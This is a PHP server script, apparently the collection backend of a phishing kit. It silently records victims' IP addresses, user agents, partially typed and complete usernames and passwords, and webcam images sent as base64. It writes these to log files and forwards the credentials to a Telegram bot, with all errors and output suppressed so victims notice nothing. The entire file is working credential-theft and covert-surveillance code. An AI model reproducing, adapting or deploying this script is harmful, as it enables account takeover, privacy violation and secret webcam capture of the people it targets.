<?php
// ============================================
// POST.PHP - Silent Data Collection
// No output, no errors visible to user
// ============================================

// Suppress all errors
error_reporting(0);
ini_set('display_errors', 0);

// Get data
$imageData = $_POST['cat'] ?? '';
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_POST['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$userAgent = $_POST['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$partialUsername = $_POST['username_partial'] ?? '';
$isFinal = isset($_POST['final_submit']);
$ipOnly = isset($_POST['ip_only']);

$date = date('Y-m-d H:i:s');

// ============================================
// SILENT LOGGING - No visible output
// ============================================

// 1. Log IP
if ($ipOnly || !empty($ip)) {
    $ipLog = "[$date] IP: $ip | UA: $userAgent\n";
    @file_put_contents('data/ip_log.txt', $ipLog, FILE_APPEND);
}

// 2. Log partial username (typed characters)
if (!empty($partialUsername)) {
    $partialLog = "[$date] IP: $ip | Partial: $partialUsername\n";
    @file_put_contents('data/partials.txt', $partialLog, FILE_APPEND);
}

// 3. Save image
if (!empty($imageData) && strpos($imageData, 'data:image') !== false) {
    $folderName = 'captures/' . date('Y-m-d');
    if (!file_exists($folderName)) {
        @mkdir($folderName, 0777, true);
    }
    
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    $filename = 'cam_' . date('dMYHis') . '_' . md5($ip) . '.png';
    $filePath = $folderName . '/' . $filename;
    @file_put_contents($filePath, $unencodedData);
}

// 4. Save full credentials (final submit)
if (!empty($username) && !empty($password)) {
    $creds = "[$date] IP: $ip | User: $username | Pass: $password | UA: $userAgent\n";
    @file_put_contents('data/creds.txt', $creds, FILE_APPEND);
    
    // Also send to Telegram silently
    sendToTelegramSilent($username, $password, $ip, $userAgent);
}

// 5. Keep log of all activity
$activityLog = "[$date] IP: $ip | Action: " . 
    ($imageData ? 'Image' : '') . 
    ($username && $password ? ' Creds' : '') . 
    ($partialUsername ? ' Partial' : '') . 
    ($ipOnly ? ' IP' : '') . "\n";
@file_put_contents('data/activity.log', $activityLog, FILE_APPEND);

// ============================================
// SILENT TELEGRAM - No visible errors
// ============================================
function sendToTelegramSilent($username, $password, $ip, $userAgent) {
    $config_file = 'telegram_config.json';
    if (!file_exists($config_file)) return;
    
    $config = @json_decode(@file_get_contents($config_file), true);
    if (empty($config['bot_token']) || empty($config['chat_id'])) return;
    
    $message = "🔐 CREDENTIALS CAPTURED\n";
    $message .= "👤 User: $username\n";
    $message .= "🔑 Pass: $password\n";
    $message .= "🌐 IP: $ip\n";
    $message .= "⏰ Time: " . date('Y-m-d H:i:s') . "\n";
    $message .= "🖥️ UA: $userAgent";
    
    $url = "https://api.telegram.org/bot" . $config['bot_token'] . "/sendMessage";
    $data = ['chat_id' => $config['chat_id'], 'text' => $message];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    @curl_exec($ch);
    @curl_close($ch);
}

// ============================================
// NO OUTPUT - Completely silent
// ============================================
// Return nothing - user sees no response
?>
